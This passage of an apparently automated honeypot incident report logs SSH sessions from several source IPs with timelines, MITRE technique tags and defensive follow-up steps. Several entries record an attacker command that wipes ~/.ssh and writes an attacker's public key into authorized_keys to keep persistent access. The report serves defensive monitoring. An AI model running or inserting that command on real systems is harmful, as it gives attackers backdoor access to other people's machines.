| `2026-05-27 09:11:17` | `cowrie.login.success` |
| `2026-05-27 09:11:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `191.101.59[.]89` to AbuseIPDB if not already reported
- [ ] Block `191.101.59[.]89` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9dfbf7b4d3be

| Field | Detail |
|---|---|
| **Source IP** | `35.210.61[.]208` |
| **First Seen** | 2026-05-27 09:13 |
| **Last Seen** | 2026-05-27 09:13 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 09:13:06` | `cowrie.session.connect` |
| `2026-05-27 09:13:06` | `cowrie.client.version` |
| `2026-05-27 09:13:07` | `cowrie.client.kex` |
| `2026-05-27 09:13:07` | `cowrie.login.success` |
| `2026-05-27 09:13:07` | `cowrie.session.params` |
| `2026-05-27 09:13:07` | `cowrie.command.input` |
| `2026-05-27 09:13:07` | `cowrie.command.failed` |
| `2026-05-27 09:13:08` | `cowrie.log.closed` |
| `2026-05-27 09:13:08` | `cowrie.session.params` |
| `2026-05-27 09:13:08` | `cowrie.command.input` |
| `2026-05-27 09:13:08` | `cowrie.session.file_download` |
| `2026-05-27 09:13:08` | `cowrie.log.closed` |
| `2026-05-27 09:13:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.210.61[.]208` to AbuseIPDB if not already reported
- [ ] Block `35.210.61[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-109fb6781b1a

| Field | Detail |
|---|---|
| **Source IP** | `35.210.61[.]208` |
| **First Seen** | 2026-05-27 09:13 |
| **Last Seen** | 2026-05-27 09:13 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 09:13:10` | `cowrie.session.connect` |
| `2026-05-27 09:13:10` | `cowrie.client.version` |
| `2026-05-27 09:13:10` | `cowrie.client.kex` |
| `2026-05-27 09:13:11` | `cowrie.login.success` |
| `2026-05-27 09:13:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.210.61[.]208` to AbuseIPDB if not already reported
- [ ] Block `35.210.61[.]208` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4659a66700c2

| Field | Detail |
|---|---|
| **Source IP** | `35.210.61[.]208` |
| **First Seen** | 2026-05-27 09:14 |
| **Last Seen** | 2026-05-27 09:14 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 09:14:32` | `cowrie.session.connect` |
| `2026-05-27 09:14:32` | `cowrie.client.version` |
| `2026-05-27 09:14:33` | `cowrie.client.kex` |
| `2026-05-27 09:14:33` | `cowrie.login.success` |
| `2026-05-27 09:14:33` | `cowrie.session.params` |
| `2026-05-27 09:14:33` | `cowrie.command.input` |
| `2026-05-27 09:14:33` | `cowrie.command.failed` |
| `2026-05-27 09:14:34` | `cowrie.log.closed` |
| `2026-05-27 09:14:34` | `cowrie.session.params` |
| `2026-05-27 09:14:34` | `cowrie.command.input` |
| `2026-05-27 09:14:34` | `cowrie.session.file_download` |
| `2026-05-27 09:14:34` | `cowrie.log.closed` |
| `2026-05-27 09:14:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.210.61[.]208` to AbuseIPDB if not already reported
- [ ] Block `35.210.61[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-da5c0d4521ef

| Field | Detail |
|---|---|
| **Source IP** | `35.210.61[.]208` |
| **First Seen** | 2026-05-27 09:14 |
| **Last Seen** | 2026-05-27 09:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 09:14:36` | `cowrie.session.connect` |
| `2026-05-27 09:14:36` | `cowrie.client.version` |
| `2026-05-27 09:14:36` | `cowrie.client.kex` |
| `2026-05-27 09:14:37` | `cowrie.login.success` |
| `2026-05-27 09:14:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.210.61[.]208` to AbuseIPDB if not already reported
- [ ] Block `35.210.61[.]208` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9c9fdbdf6283

| Field | Detail |
|---|---|
| **Source IP** | `35.210.61[.]208` |
| **First Seen** | 2026-05-27 09:16 |
| **Last Seen** | 2026-05-27 09:16 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 09:16:02` | `cowrie.session.connect` |
| `2026-05-27 09:16:02` | `cowrie.client.version` |
| `2026-05-27 09:16:02` | `cowrie.client.kex` |
| `2026-05-27 09:16:02` | `cowrie.login.success` |
| `2026-05-27 09:16:03` | `cowrie.session.params` |
| `2026-05-27 09:16:03` | `cowrie.command.input` |
| `2026-05-27 09:16:03` | `cowrie.command.failed` |
| `2026-05-27 09:16:03` | `cowrie.log.closed` |
| `2026-05-27 09:16:03` | `cowrie.session.params` |
| `2026-05-27 09:16:03` | `cowrie.command.input` |
| `2026-05-27 09:16:03` | `cowrie.session.file_download` |
| `2026-05-27 09:16:03` | `cowrie.log.closed` |
| `2026-05-27 09:16:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.210.61[.]208` to AbuseIPDB if not already reported
- [ ] Block `35.210.61[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-374cf3a035ee

| Field | Detail |
|---|---|
| **Source IP** | `35.210.61[.]208` |
| **First Seen** | 2026-05-27 09:16 |
| **Last Seen** | 2026-05-27 09:16 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 09:16:05` | `cowrie.session.connect` |
| `2026-05-27 09:16:05` | `cowrie.client.version` |
| `2026-05-27 09:16:05` | `cowrie.client.kex` |
| `2026-05-27 09:16:06` | `cowrie.login.success` |
| `2026-05-27 09:16:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.210.61[.]208` to AbuseIPDB if not already reported
- [ ] Block `35.210.61[.]208` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f01a94ea76ad

| Field | Detail |
|---|---|
| **Source IP** | `35.210.61[.]208` |
| **First Seen** | 2026-05-27 09:17 |
| **Last Seen** | 2026-05-27 09:17 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 09:17:29` | `cowrie.session.connect` |
| `2026-05-27 09:17:29` | `cowrie.client.version` |
| `2026-05-27 09:17:29` | `cowrie.client.kex` |
| `2026-05-27 09:17:30` | `cowrie.login.success` |
| `2026-05-27 09:17:30` | `cowrie.session.params` |
| `2026-05-27 09:17:30` | `cowrie.command.input` |
| `2026-05-27 09:17:30` | `cowrie.command.failed` |
| `2026-05-27 09:17:30` | `cowrie.log.closed` |
| `2026-05-27 09:17:30` | `cowrie.session.params` |
| `2026-05-27 09:17:30` | `cowrie.command.input` |
| `2026-05-27 09:17:31` | `cowrie.session.file_download` |
| `2026-05-27 09:17:31` | `cowrie.log.closed` |
| `2026-05-27 09:17:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.210.61[.]208` to AbuseIPDB if not already reported
- [ ] Block `35.210.61[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2b217d019ba5

| Field | Detail |
|---|---|
| **Source IP** | `35.210.61[.]208` |
| **First Seen** | 2026-05-27 09:17 |
| **Last Seen** | 2026-05-27 09:17 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 09:17:33` | `cowrie.session.connect` |
| `2026-05-27 09:17:33` | `cowrie.client.version` |
| `2026-05-27 09:17:33` | `cowrie.client.kex` |
| `2026-05-27 09:17:33` | `cowrie.login.success` |
| `2026-05-27 09:17:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.210.61[.]208` to AbuseIPDB if not already reported
- [ ] Block `35.210.61[.]208` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5bd0405a6b66

| Field | Detail |
|---|---|
| **Source IP** | `35.210.61[.]208` |
| **First Seen** | 2026-05-27 09:20 |
| **Last Seen** | 2026-05-27 09:20 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 09:20:10` | `cowrie.session.connect` |
| `2026-05-27 09:20:10` | `cowrie.client.version` |
| `2026-05-27 09:20:10` | `cowrie.client.kex` |
| `2026-05-27 09:20:10` | `cowrie.login.success` |
| `2026-05-27 09:20:11` | `cowrie.session.params` |
| `2026-05-27 09:20:11` | `cowrie.command.input` |
| `2026-05-27 09:20:11` | `cowrie.command.failed` |
| `2026-05-27 09:20:11` | `cowrie.log.closed` |
| `2026-05-27 09:20:11` | `cowrie.session.params` |
| `2026-05-27 09:20:11` | `cowrie.command.input` |
| `2026-05-27 09:20:11` | `cowrie.session.file_download` |
| `2026-05-27 09:20:11` | `cowrie.log.closed` |
| `2026-05-27 09:20:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.210.61[.]208` to AbuseIPDB if not already reported
- [ ] Block `35.210.61[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b2edd0948645

| Field | Detail |
|---|---|
| **Source IP** | `35.210.61[.]208` |
| **First Seen** | 2026-05-27 09:20 |
| **Last Seen** | 2026-05-27 09:20 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 09:20:13` | `cowrie.session.connect` |
| `2026-05-27 09:20:13` | `cowrie.client.version` |
| `2026-05-27 09:20:13` | `cowrie.client.kex` |
| `2026-05-27 09:20:14` | `cowrie.login.success` |
| `2026-05-27 09:20:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.210.61[.]208` to AbuseIPDB if not already reported
- [ ] Block `35.210.61[.]208` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-48ca150fa043

| Field | Detail |
|---|---|
| **Source IP** | `35.210.61[.]208` |
| **First Seen** | 2026-05-27 09:22 |
| **Last Seen** | 2026-05-27 09:23 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 09:22:55` | `cowrie.session.connect` |
| `2026-05-27 09:22:55` | `cowrie.client.version` |
| `2026-05-27 09:22:55` | `cowrie.client.kex` |
| `2026-05-27 09:22:56` | `cowrie.login.success` |
| `2026-05-27 09:22:56` | `cowrie.session.params` |
| `2026-05-27 09:22:56` | `cowrie.command.input` |
| `2026-05-27 09:22:56` | `cowrie.command.failed` |
| `2026-05-27 09:22:57` | `cowrie.log.closed` |
| `2026-05-27 09:22:57` | `cowrie.session.params` |
| `2026-05-27 09:22:57` | `cowrie.command.input` |
| `2026-05-27 09:22:57` | `cowrie.session.file_download` |
| `2026-05-27 09:22:57` | `cowrie.log.closed` |
| `2026-05-27 09:23:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.210.61[.]208` to AbuseIPDB if not already reported
- [ ] Block `35.210.61[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-063661870c4c

| Field | Detail |
|---|---|
| **Source IP** | `35.210.61[.]208` |
| **First Seen** | 2026-05-27 09:22 |
| **Last Seen** | 2026-05-27 09:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 09:22:59` | `cowrie.session.connect` |
| `2026-05-27 09:22:59` | `cowrie.client.version` |
| `2026-05-27 09:22:59` | `cowrie.client.kex` |
| `2026-05-27 09:23:00` | `cowrie.login.success` |
| `2026-05-27 09:23:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.210.61[.]208` to AbuseIPDB if not already reported
- [ ] Block `35.210.61[.]208` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e5bbab5a220d

| Field | Detail |
|---|---|
| **Source IP** | `172.191.94[.]172` |
| **First Seen** | 2026-05-27 09:30 |
| **Last Seen** | 2026-05-27 09:31 |
| **Session Duration** | 66s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 09:30:49` | `cowrie.session.connect` |
| `2026-05-27 09:30:52` | `cowrie.client.version` |
| `2026-05-27 09:30:52` | `cowrie.client.kex` |
| `2026-05-27 09:31:04` | `cowrie.login.success` |
| `2026-05-27 09:31:19` | `cowrie.session.params` |
| `2026-05-27 09:31:19` | `cowrie.command.input` |
| `2026-05-27 09:31:19` | `cowrie.command.failed` |
| `2026-05-27 09:31:20` | `cowrie.log.closed` |
| `2026-05-27 09:31:21` | `cowrie.session.params` |
| `2026-05-27 09:31:21` | `cowrie.command.input` |
| `2026-05-27 09:31:21` | `cowrie.session.file_download` |
| `2026-05-27 09:31:21` | `cowrie.log.closed` |
| `2026-05-27 09:31:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.191.94[.]172` to AbuseIPDB if not already reported
- [ ] Block `172.191.94[.]172` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b677d626a6e9

| Field | Detail |
|---|---|
| **Source IP** | `172.191.94[.]172` |
| **First Seen** | 2026-05-27 09:31 |
| **Last Seen** | 2026-05-27 09:31 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 09:31:47` | `cowrie.session.connect` |
| `2026-05-27 09:31:48` | `cowrie.client.version` |
| `2026-05-27 09:31:50` | `cowrie.client.kex` |
| `2026-05-27 09:31:54` | `cowrie.login.success` |
| `2026-05-27 09:31:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.191.94[.]172` to AbuseIPDB if not already reported
- [ ] Block `172.191.94[.]172` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8e6585a4339d

| Field | Detail |
|---|---|
| **Source IP** | `172.191.94[.]172` |
| **First Seen** | 2026-05-27 09:53 |
| **Last Seen** | 2026-05-27 09:54 |
| **Session Duration** | 74s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 09:53:35` | `cowrie.session.connect` |
| `2026-05-27 09:53:38` | `cowrie.client.version` |
| `2026-05-27 09:53:38` | `cowrie.client.kex` |
| `2026-05-27 09:53:47` | `cowrie.login.success` |
| `2026-05-27 09:53:52` | `cowrie.session.params` |
| `2026-05-27 09:53:52` | `cowrie.command.input` |
| `2026-05-27 09:53:52` | `cowrie.command.failed` |
| `2026-05-27 09:53:53` | `cowrie.log.closed` |
| `2026-05-27 09:54:01` | `cowrie.session.params` |
| `2026-05-27 09:54:01` | `cowrie.command.input` |
| `2026-05-27 09:54:07` | `cowrie.session.file_download` |
| `2026-05-27 09:54:07` | `cowrie.log.closed` |
| `2026-05-27 09:54:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.191.94[.]172` to AbuseIPDB if not already reported
- [ ] Block `172.191.94[.]172` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8bb31a508935

| Field | Detail |
|---|---|
| **Source IP** | `172.191.94[.]172` |
| **First Seen** | 2026-05-27 09:54 |
| **Last Seen** | 2026-05-27 09:54 |
| **Session Duration** | 19s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 09:54:30` | `cowrie.session.connect` |
| `2026-05-27 09:54:30` | `cowrie.client.version` |
| `2026-05-27 09:54:31` | `cowrie.client.kex` |
| `2026-05-27 09:54:47` | `cowrie.login.success` |
| `2026-05-27 09:54:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.191.94[.]172` to AbuseIPDB if not already reported
- [ ] Block `172.191.94[.]172` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `193.122.68[.]142` | **87** | 2026-05-27 06:31 | 2026-05-27 06:51 | 44m | 0 | `T1592` | 🟠 MEDIUM |
| `181.233.89[.]137` | **28** | 2026-05-27 07:29 | 2026-05-27 07:59 | 56m | 0 | `T1592` | 🟠 MEDIUM |
| `160.153.175[.]11` | **18** | 2026-05-27 04:12 | 2026-05-27 05:04 | 9m | 0 | `T1592` | 🟠 MEDIUM |
| `98.158.129[.]28` | **17** | 2026-05-27 04:16 | 2026-05-27 07:33 | 9m | 0 | `T1592` | 🟠 MEDIUM |
| `152.200.205[.]179` | **12** | 2026-05-27 07:04 | 2026-05-27 07:27 | 0m | 12 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `35.210.61[.]208` | **12** | 2026-05-27 09:07 | 2026-05-27 09:27 | 0m | 12 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `172.191.94[.]172` | **11** | 2026-05-27 08:38 | 2026-05-27 09:54 | 2m | 8 | `T1110.001 · T1592` | 🟠 MEDIUM |
